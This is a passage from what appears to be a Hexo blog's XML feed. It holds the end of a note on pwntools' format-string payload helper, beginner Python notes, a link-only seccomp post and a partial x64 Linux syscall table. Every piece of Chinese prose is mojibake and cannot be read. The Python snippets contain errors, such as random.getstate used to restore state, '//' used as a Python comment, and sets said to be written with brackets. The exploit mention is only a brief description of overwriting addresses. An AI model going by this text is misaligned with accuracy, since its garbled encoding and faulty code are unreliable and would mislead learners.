value})</p><p>ç¬¬ä¸€ä¸ªå‚æ•° offset ç”¨ autofmt.offset ç®—å¥½çš„å³å¯ã€‚ </p><p>ç„¶åï¼Œæˆ‘ä»¬éœ€è¦å£°æ˜ {address: value} æ¥è¦†ç›–addressçš„å†…å®¹æˆå¯¹åº”çš„valueã€‚æˆ‘ä»¬è¿˜å¯ä»¥åŒæ—¶æ”¹å†™å¤šä¸ªåœ°å€ï¼š</p><p>{address1:value1,address2:value2,â€¦,address:valueN}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pythonçš„åˆå­¦æ—¶å…‰</title>
      <link href="/2020/02/24/python%E7%9A%84%E5%88%9D%E5%AD%A6%E6%97%B6%E5%85%89/"/>
      <url>/2020/02/24/python%E7%9A%84%E5%88%9D%E5%AD%A6%E6%97%B6%E5%85%89/</url>
      
        <content type="html"><![CDATA[<h4 id="pythonçš„ä¸€äº›å°ç‚¹è®°å½•"><a href="#pythonçš„ä¸€äº›å°ç‚¹è®°å½•" class="headerlink" title="pythonçš„ä¸€äº›å°ç‚¹è®°å½•"></a>pythonçš„ä¸€äº›å°ç‚¹è®°å½•</h4><h5 id="åœ¨ä¸€è¡Œçš„æœ«å°¾ä½œä¸ºè·¨è¡Œå­—ç¬¦ä¸²"><a href="#åœ¨ä¸€è¡Œçš„æœ«å°¾ä½œä¸ºè·¨è¡Œå­—ç¬¦ä¸²" class="headerlink" title="\åœ¨ä¸€è¡Œçš„æœ«å°¾ä½œä¸ºè·¨è¡Œå­—ç¬¦ä¸²"></a>\åœ¨ä¸€è¡Œçš„æœ«å°¾ä½œä¸ºè·¨è¡Œå­—ç¬¦ä¸²</h5><p>ä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">"a\n</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ä½ æƒ³æŒ‰å›è½¦è¿›è¡Œä¸‹ä¸€è¡Œè¾“å…¥ï¼Œå°±ä¼šå‘ç°</p><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5Cpython%E7%9A%84%E5%88%9D%E5%AD%A6%E6%97%B6%E5%85%89%5Cimage-20200224182743559.png" alt="image-20200224182743559"></p><img src="/2020/02/24/pythonçš„åˆå­¦æ—¶å…‰/image-20200224182743559.png"><p>æ˜¯çš„ï¼Œä¸å…è®¸äº†ã€‚è¿™æ—¶å€™å°±å¯ä»¥åœ¨\nåå†åŠ ä¸Š\</p><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5Cpython%E7%9A%84%E5%88%9D%E5%AD%A6%E6%97%B6%E5%85%89%5Cimage-20200224183022740.png" alt="image-20200224183022740"></p><img src="/2020/02/24/pythonçš„åˆå­¦æ—¶å…‰/image-20200224183022740.png"><p>ä½†æ˜¯å‘¢ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨å¦å¤–ä¸€ç§å†™æ³•â€”-é•¿å­—ç¬¦ä¸²(triple quoted)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">'''a</span></span><br><span class="line"><span class="string">aaa</span></span><br><span class="line"><span class="string">aaa</span></span><br><span class="line"><span class="string">aaa'''</span>)</span><br></pre></td></tr></table></figure><p>è¿™ä¹Ÿæ˜¯å®Œå…¨å…è®¸çš„ï¼</p><h5 id="randomæ¨¡å—"><a href="#randomæ¨¡å—" class="headerlink" title="randomæ¨¡å—"></a>randomæ¨¡å—</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = random.getstate() //è·å–seedæƒ…å†µ</span><br><span class="line">random.getstate(x) //è¿™æ ·å°±èƒ½å°†seedæƒ…å†µè¿˜åŸä¸ºä»¥å‰è®°å½•çš„æƒ…å†µ</span><br></pre></td></tr></table></figure><h5 id="decimalæ¨¡å—ï¼ˆåè¿›åˆ¶æ•°ï¼‰"><a href="#decimalæ¨¡å—ï¼ˆåè¿›åˆ¶æ•°ï¼‰" class="headerlink" title="decimalæ¨¡å—ï¼ˆåè¿›åˆ¶æ•°ï¼‰"></a>decimalæ¨¡å—ï¼ˆåè¿›åˆ¶æ•°ï¼‰</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = decimal.Decimal(<span class="string">'0.1'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = decimal.Decimal(<span class="string">'0.2'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(a+b)</span><br><span class="line"><span class="number">0.3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = decimal.Decimal(<span class="string">'0.3'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a + b == c</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><h5 id="åˆ—è¡¨çš„æ’å…¥"><a href="#åˆ—è¡¨çš„æ’å…¥" class="headerlink" title="åˆ—è¡¨çš„æ’å…¥"></a>åˆ—è¡¨çš„æ’å…¥</h5><p>.append()</p><p>å…è®¸å¾€åˆ—è¡¨æœ«å°¾æ’å…¥ä¸€ä¸ªå…ƒç´ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">number.append(<span class="string">'1'</span>)</span><br></pre></td></tr></table></figure><p>.extend()</p><p>å…è®¸å¾€åˆ—è¡¨æœ«å°¾æ’å…¥ä»»æ„ä¸ªå…ƒç´ </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">number.extend([<span class="string">'ç«¹æ—'</span>,<span class="string">'æˆ‘å»'</span>])</span><br></pre></td></tr></table></figure><p>.insert()</p><p>å…è®¸å¾€åˆ—è¡¨ä»»æ„ä½ç½®æ’å…¥ä¸€ä¸ªå…ƒç´ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">number.insert(<span class="number">0</span>,<span class="string">'xx'</span>)</span><br></pre></td></tr></table></figure><h5 id="è¿‡æ»¤å™¨"><a href="#è¿‡æ»¤å™¨" class="headerlink" title="è¿‡æ»¤å™¨"></a>è¿‡æ»¤å™¨</h5><p>filter(function or None, iterable)</p><p>filter()ä¼šè‡ªåŠ¨å°†ä¸ºFlaseçš„å…ƒç´ è¿‡æ»¤ï¼Œè¾“å‡ºæ–¹æ³•ä¸ºTrueçš„å…ƒç´ </p><p>ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥æ˜¯ä¸€ä¸ªå‡½æ•°ä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªNoneã€‚</p><p>å½“ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå‡½æ•°æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥äººä¸ºå®šä¹‰è¿™ä¸ªå‡½æ•°å½“ä½œä¸€ä¸ªè¿‡æ»¤è§„åˆ™ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">odd</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x%<span class="number">2</span></span><br><span class="line"></span><br><span class="line">temp = range(<span class="number">10</span>)  //<span class="number">0</span><span class="number">-9</span></span><br><span class="line">show = filter(odd,temp)</span><br><span class="line">list(show)</span><br><span class="line">[<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>]</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list(filter(<span class="keyword">lambda</span> x:x%<span class="number">2</span>,temp))</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œè¿˜æœ‰ä¸€ç§ç±»ä¼¼çš„å‡½æ•°ï¼Œmap()ã€‚ä½†æ˜¯mapä¸æ˜¯è¿‡æ»¤å™¨ï¼Œè€Œä¸”æ˜¯éå†çš„ï¼Œè¾“å‡ºçš„æ˜¯å€¼ã€‚</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list(map(<span class="keyword">lambda</span> x:<span class="keyword">not</span>(x%<span class="number">3</span>),range(<span class="number">100</span>)))</span><br><span class="line">[<span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">True</span>]</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šmap()åé¢æ˜¯å¯ä»¥æ¥å—å¤šä¸ªåºåˆ—ä½œä¸ºå‚æ•°çš„</p><p>å°†å­—ç¬¦ä¸²è½¬ä¸ºäºŒè¿›åˆ¶è¾“å‡º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(s)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>.join([bin(ord(c)).replace(<span class="string">'0b'</span>,<span class="string">''</span>)<span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br></pre></td></tr></table></figure><p>åœ¨å­—ç¬¦ä¸²ä¸­æ’å…¥å­—ç¬¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a =<span class="string">'asdefregtreytrh'</span></span><br><span class="line">lista = list(a)//å› ä¸ºpythonä¸­stræ˜¯ä¸å¯å˜çš„å˜é‡ï¼Œæ‰€ä»¥éœ€è¦listè¾…åŠ©</span><br><span class="line">lista.insert(<span class="number">1</span>,<span class="string">','</span>)</span><br><span class="line">a = <span class="string">''</span>.join(lista)</span><br></pre></td></tr></table></figure><p>åœ¨å­—ç¬¦ä¸²ä¸­åˆ å»ä½ ä¸è¦çš„å­—ç¬¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a =<span class="string">'asdefregtreytrh'</span></span><br><span class="line">lista = list(a)</span><br><span class="line">c=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lista:</span><br><span class="line"><span class="keyword">if</span> i != <span class="string">'a'</span>:</span><br><span class="line">c=c+[i]</span><br><span class="line"></span><br><span class="line">a=<span class="string">''</span>.join(c)</span><br></pre></td></tr></table></figure><h5 id="å­—å…¸"><a href="#å­—å…¸" class="headerlink" title="å­—å…¸"></a>å­—å…¸</h5><p>ç”¨{:}è¡¨ç¤ºå­—å…¸</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict1 =&#123;&#125;</span><br></pre></td></tr></table></figure><p>å­—å…¸å­˜åœ¨keyå’Œvaluesç›¸å¯¹åº”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict1&#123;key:values&#125;</span><br></pre></td></tr></table></figure><p>keys()</p><p>æ‰“å°æ‰€æœ‰çš„key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dict1 = dict1.fromkeys(range(<span class="number">32</span>),<span class="string">'èµ'</span>)</span><br><span class="line">dict1.keys()</span><br><span class="line">dict_keys([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>])</span><br></pre></td></tr></table></figure><p>ç›¸å¯¹åº”çš„values()</p><p>æ‰“å°æ‰€æœ‰çš„values</p><p>items()</p><p>ç”¨å…ƒç»„çš„å½¢å¼å°†æ¯ä¸€ä¸ªéƒ½æ‰“å°å‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> eachItem <span class="keyword">in</span> dict1.items():</span><br><span class="line">print(eachItem)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="number">0</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">1</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">3</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">4</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">5</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">6</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">7</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">8</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">9</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">10</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">11</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">12</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">13</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">14</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">15</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">16</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">17</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">18</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">19</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">20</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">21</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">22</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">23</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">24</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">25</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">26</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">27</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">28</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">29</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">30</span>, <span class="string">'èµ'</span>)</span><br><span class="line">(<span class="number">31</span>, <span class="string">'èµ'</span>)</span><br></pre></td></tr></table></figure><p>get()</p><p>åˆ©ç”¨get()æ–¹æ³•æ¥æŸ¥æ‰¾å­—å…¸ä¸­çš„å…ƒç´ ï¼Œå¦‚æœä¸å­˜åœ¨äºå­—å…¸ä¸­ï¼Œå…¶ä¸ä¼šæŠ¥é”™ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(dict1.get(<span class="number">32</span>))</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure><p>clear()</p><p>æ¸…ç©ºå­—å…¸</p><p>copy()</p><p>æµ…æ‹·è´</p><h5 id="é›†åˆ"><a href="#é›†åˆ" class="headerlink" title="é›†åˆ"></a>é›†åˆ</h5><p>ç”¨[]è¡¨ç¤ºé›†åˆï¼Œæ³¨æ„ä¸ä¸Šé¢å­—å…¸çš„åŒºåˆ†ã€‚é›†åˆç‰¹å¾:å”¯ä¸€ï¼Œæ— åºï¼Œä¸èƒ½ç´¢å¼•</p><p>frozenset() å›ºå®šé›†åˆï¼Œä¸å…è®¸æ·»åŠ åˆ é™¤</p><h5 id="æ–‡ä»¶"><a href="#æ–‡ä»¶" class="headerlink" title="æ–‡ä»¶"></a>æ–‡ä»¶</h5><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5Cpython%E7%9A%84%E5%88%9D%E5%AD%A6%E6%97%B6%E5%85%89%5Cimage-20200330224505185.png" alt="image-20200330224505185"></p><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5Cpython%E7%9A%84%E5%88%9D%E5%AD%A6%E6%97%B6%E5%85%89%5Cimage-20200330225459775.png" alt="image-20200330225459775"></p><h5 id="osæ¨¡å—"><a href="#osæ¨¡å—" class="headerlink" title="osæ¨¡å—"></a>osæ¨¡å—</h5><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5Cpython%E7%9A%84%E5%88%9D%E5%AD%A6%E6%97%B6%E5%85%89%5Cimage-20200416130857601.png" alt="image-20200416130857601"></p><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5Cpython%E7%9A%84%E5%88%9D%E5%AD%A6%E6%97%B6%E5%85%89%5Cimage-20200416130921972.png" alt="image-20200416130921972"></p><h5 id="å¼‚å¸¸æ•è·"><a href="#å¼‚å¸¸æ•è·" class="headerlink" title="å¼‚å¸¸æ•è·"></a>å¼‚å¸¸æ•è·</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">[ä»£ç å—]</span><br><span class="line"><span class="keyword">except</span> [å¼‚å¸¸åå­—] <span class="keyword">as</span> reason:</span><br><span class="line">[å¯¹ä¸Šé¢<span class="keyword">try</span>ä¸­å‡ºç°çš„å¼‚å¸¸è¿›è¡Œå¤„ç†]</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">[ä¸ç®¡æ€ä¹ˆæ ·éƒ½ä¼šæ‰§è¡Œçš„]</span><br></pre></td></tr></table></figure><p>å¦‚æœï¼Œæƒ³å¼‚å¸¸æŠ¥é”™åï¼Œé‡å¤æ‰§è¡Œtry</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">[]</span><br><span class="line"><span class="keyword">break</span> <span class="comment">#æ³¨æ„è¿™é‡Œ</span></span><br><span class="line"><span class="keyword">except</span> [] <span class="keyword">as</span> reason:</span><br><span class="line">[]</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">[]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>seccompå­¦ä¹ ç¬”è®°</title>
      <link href="/2019/12/02/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/12/02/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>ç›´æ¥è´´ä¸ŠVçˆ·çˆ·çš„åœ°å€</p><p><a href="https://veritas501.space/2018/05/05/seccompå­¦ä¹ ç¬”è®°/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linuxç³»ç»Ÿè°ƒç”¨è¡¨(system call table)</title>
      <link href="/2019/11/18/linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8-system-call-table/"/>
      <url>/2019/11/18/linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8-system-call-table/</url>
      
        <content type="html"><![CDATA[<h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><table><thead><tr><th align="left">%rax</th><th align="left">System call</th><th align="left">%rdi</th><th align="left">%rsi</th><th align="left">%rdx</th><th align="left">%r10</th><th align="left">%r8</th><th align="left">%r9</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">sys_read</td><td align="left">unsigned int fd</td><td align="left">char *buf</td><td align="left">size_t count</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">1</td><td align="left">sys_write</td><td align="left">unsigned int fd</td><td align="left">const char *buf</td><td align="left">size_t count</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">2</td><td align="left">sys_open</td><td align="left">const char *filename</td><td align="left">int flags</td><td align="left">int mode</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">3</td><td align="left">sys_close</td><td align="left">unsigned int fd</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">4</td><td align="left">sys_stat</td><td align="left">const char *filename</td><td align="left">struct stat *statbuf</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">5</td><td align="left">sys_fstat</td><td align="left">unsigned int fd</td><td align="left">struct stat *statbuf</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">6</td><td align="left">sys_lstat</td><td align="left">fconst char *filename</td><td align="left">struct stat *statbuf</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">7</td><td align="left">sys_poll</td><td align="left">struct poll_fd *ufds</td><td align="left">unsigned int nfds</td><td align="left">long timeout_msecs</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">8</td><td align="left">sys_lseek</td><td align="left">unsigned int fd</td><td align="left">off_t offset</td><td align="left">unsigned int origin</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">9</td><td align="left">sys_mmap</td><td align="left">unsigned long addr</td><td align="left">unsigned long len</td><td align="left">unsigned long prot</td><td align="left">unsigned long flags</td><td align="left">unsigned long fd</td><td align="left">unsigned long off</td></tr><tr><td align="left">10</td><td align="left">sys_mprotect</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left">unsigned long prot</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">11</td><td align="left">sys_munmap</td><td align="left">unsigned long addr</td><td align="left">size_t len</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">12</td><td align="left">sys_brk</td><td align="left">unsigned long brk</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">13</td><td align="left">sys_rt_sigaction</td><td align="left">int sig</td><td align="left">const struct sigaction *act</td><td align="left">struct sigaction *oact</td><td align="left">size_t sigsetsize</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">14</td><td align="left">sys_rt_sigprocmask</td><td align="left">int how</td><td align="left">sigset_t *nset</td><td align="left">sigset_t *oset</td><td align="left">size_t sigsetsize</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">15</td><td align="left">sys_rt_sigreturn</td><td align="left">unsigned long __unused</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">16</td><td align="left">sys_ioctl</td><td align="left">unsigned int fd</td><td align="left">unsigned int cmd</td><td align="left">unsigned long arg</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">17</td><td align="left">sys_pread64</td><td align="left">unsigned long fd</td><td align="left">char *buf</td><td align="left">size_t count</td><td align="left">loff_t pos</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">18</td><td align="left">sys_pwrite64</td><td align="left">unsigned int fd</td><td align="left">const char *buf</td><td align="left">size_t count</td><td align="left">loff_t pos</td><td align="left"></td><td align="left"></td></tr><tr><td align="left">19</td><td align="left">sys_readv</td><td align="left">unsigned long fd</td><td align="left">const struct iovec *vec</td><td align="left">unsigned long vlen</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">20</td><td align="left">sys_writev</td><td align="left">unsigned long fd</td><td align="left">const struct iovec *vec</td><td align="left">unsigned long vlen</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">21</td><td align="left">sys_access</td><td align="left">const char *filename</td><td align="left">int mode</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">22</td><td align="left">sys_pipe</td><td align="left">int *filedes</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">23</td><td align="left">sys_select</td><td align="left">int n</td><td align="left">fd_set *inp</td><td align="left">fd_set *outp</td><td align="left">fd_set*exp</td><td align="left">struct timeval *tvp</td><td align="left"></td></tr><tr><td align="left">24</td><td align="left">sys_sched_yield</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">25</td><td align="left">sys_mremap</td><td align="left">unsigned long addr</td><td align="left">unsigned long old_len</td><td align="left">unsigned long new_len</td><td align="left">unsigned long flags</td><td align="left">unsigned long new_addr</td><td align="left"></td></tr><tr><td align="left">26</td><td align="left">sys_msync</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left">int flags</td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">27</td><td align="left">sys_mincore</td><td align="left">unsigned long start</td><td align="left">size_t len</td><td align="left">unsigned char *vec</td><td 